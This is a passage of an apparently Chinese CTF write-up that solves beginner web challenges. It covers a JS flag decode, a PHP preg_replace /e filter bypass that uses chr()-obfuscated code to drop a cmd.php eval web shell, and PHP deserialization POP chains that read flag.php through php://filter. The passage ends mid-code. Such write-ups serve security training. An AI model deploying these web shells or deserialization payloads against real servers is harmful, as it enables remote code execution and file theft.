javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> galf <span class=\"token operator\">=</span> <span class=\"token string\">\"\\u005a\\u006d\\u0078\\u0068\\u005a\\u0033\\u0073\\u0035\\u004d\\u006d\\u004a\\u006b\\u005a\\u0057\\u0055\\u007a\\u0059\\u0079\\u0030\\u0030\\u0059\\u0054\\u0068\\u006d\\u004c\\u0054\\u0051\\u0031\\u004d\\u0054\\u004d\\u0074\\u004f\\u0057\\u0049\\u0034\\u0059\\u0079\\u0031\\u0069\\u0059\\u006d\\u0056\\u006a\\u004f\\u0054\\u004e\\u006a\\u005a\\u006a\\u005a\\u0069\\u004e\\u006a\\u0042\\u0039\\u000a\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token function\">atob</span><span class=\"token punctuation\">(</span>galf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>unicode 编码，解码即可得到 flag，或者在控制台运行 won 函数。</p>\n<p>修改分数可以在\tif (scores&gt;99999) 地方设置断点，然后将里面的 scores 变量改为大与 99999 就可以了。</p>\n<h3 id=\"week1ezphp\"><a class=\"anchor\" href=\"#week1ezphp\">#</a> [WEEK1]ezphp</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pattern'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$pattern</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pattern'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\\.|\\`|read*|show|file|\\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\\/| |\\?|mv|cp|next|show_source|highlight_file|glob|\\~|\\^|\\||\\&amp;|\\*|\\%/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/('</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$pattern</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">')/ei'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'print_r(\"\\\\1\")'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you are smart\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"try again\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"it is begin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>很显然把各种能用的 payload 过滤死了，但是没有关系，preg_match 强制要求第二个参数必须是 string，否则返回 false，但是 preg_replace 的参数都可以传入数组，所以可以采用数组绕过。</p>\n<p>本题的考点就是 \\e 的命令执行，具体可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjU1Nw==\">深入研究 preg_replace 与代码执行</span></p>\n<p>payload:</p>\n<blockquote>\n<p phpinfo()=\"\">code=$</p>\n<p>pattern=\\S.*</p>\n</blockquote>\n<p>flag 就在配置文件中。</p>\n<p>由于 preg_replace 中可操作性比较小，先直接释放一句话木马：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token selector\">/?code[]=</span><span class=\"token punctuation\">&#123;</span>$<span class=\"token punctuation\">&#123;</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>102<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>112<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>117<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>116<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>115<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>40<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>102<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>111<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>112<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>101<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>110<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>40<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>39<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>99<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>109<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>100<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>46<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>112<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>104<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>112<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>39<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>44<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>39<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>119<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>39<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>41<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>44<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>39<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>60<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>63<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>112<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>104<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>112<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>32<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>101<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>118<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>97<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>108<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>40<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>36<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>95<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>71<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>69<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>84<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>91<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>99<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>109<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>100<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>93<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>41<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>63<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>62<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span> 39<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>41<span class=\"token punctuation\">)</span>.<span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>59<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>pattern=.*</pre></td></tr></table></figure><p>文件内容为：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fputs(fopen('cmd.php','w'),'<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span>');</pre></td></tr></table></figure><p>然后接下来就可以进行命令执行拿到 flag 了。</p>\n<p>换句话来说，只要不出现单引号和双引号，命令就可以正常运行，所以也能用无参 rce 来做这题。</p>\n<h3 id=\"week1生成你的邀请函吧~\"><a class=\"anchor\" href=\"#week1生成你的邀请函吧~\">#</a> [WEEK1] 生成你的邀请函吧～</h3>\n<p>题目要求：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token selector\">API：url/generate_invitation  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Request：POST application/json  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Body：</span><span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Yourname\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string\">\"imgurl\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg\"</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>使用POST json请求来生成你的邀请函吧~flag就在里面哦~</pre></td></tr></table></figure><p>随便用一个发包工具发包即可：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token selector\">POST /generate_invitation   HTTP/1.1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Content-Type: application/json </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Host: 112.6.51.212:31690</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></span><span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"p1kap1\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">\"imgurl\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg\"</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>得到一张图片，图片上面即为 flag。</p>\n<h3 id=\"week2no_wake_up\"><a class=\"anchor\" href=\"#week2no_wake_up\">#</a> [WEEK2]no_wake_up</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">flag</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"guest\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'try'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>简单的反序列化题，上链子：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">flag</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"php://filter/convert.base64-encode/resource=flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><blockquote s:8:username;s:5:admin;s:4:code;s:52:php:filterconvert.base64-encoderesource=\"flag.php;\">\n<p>/wakeup.php?try=O:4:&quot;flag&quot;:2:</p>\n</blockquote>\n<p>解码得到 flag。</p>\n<h3 id=\"week2serialize\"><a class=\"anchor\" href=\"#week2serialize\">#</a> [WEEK2]serialize</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">misca</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$gao</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$fei</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">miaomiao</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">gao</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">fei</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">miaomiao</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'Mikey Mouse~'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">musca</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$ding</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dong</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">ding</span><span class=\"token operator\">-></span><span class=\"token property\">dong</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">milaoshu</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$v</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__tostring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">echo</span><span class=\"token string double-quoted-string\">\"misca~musca~milaoshu~~~\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">v</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^O:\\d+/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"you should think harder!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">return</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"wanna_fl.ag\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>三个考点，</p>\n<p>第一个是构造 pop 链，musca:wakeup ()-&gt;misca:get ()-&gt;milaoshu:tostring ()，唯一稍难的点在于如何从 get ()-&gt;__tostring ()，tostring 的触发条件是当一个类对象被当作字符串时触发，那么显然我们想触发 tostring，需要利用 die 这个函数。</p>\n<p>第二个考点就是我们在调用 die 函数之前调用了 miaomiao 这个方法，将 a 进行了提前赋值，所以为了让 a 为类 milaoshu，我们可以通过应用让它和 gao 指向同一位置。</p>\n<p>第三就是绕过 check 函数，无非就是对 “O: 数字” 这样的形式进行了过滤，两种绕过方法，使用 + 或者直接使用 array 去序列化，但前者受 php 版本限制，所以一般更倾向于使用后者去绕过。</p>\n<p>最后注意传参就行了。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">misca</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$gao</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$fei</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">//    public function __get($key)&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token 